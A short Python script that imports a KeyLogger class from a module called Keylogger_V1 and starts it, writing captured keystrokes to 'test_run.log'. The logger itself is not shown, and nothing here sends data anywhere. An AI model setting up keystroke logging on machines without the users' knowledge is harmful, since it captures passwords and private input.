## ------------------------------------------------------------------------------------- ##
from Keylogger_V1 import KeyLogger

# Name of the file to redirect output
file_name = 'test_run.log'
logger_script = 'Keylogger_V1.py'

# Create the logger instance and start
test_keylogger_instance = KeyLogger(file_name)
test_keylogger_instance.start_log()
## ------------------------------------------------------------------------------------- ##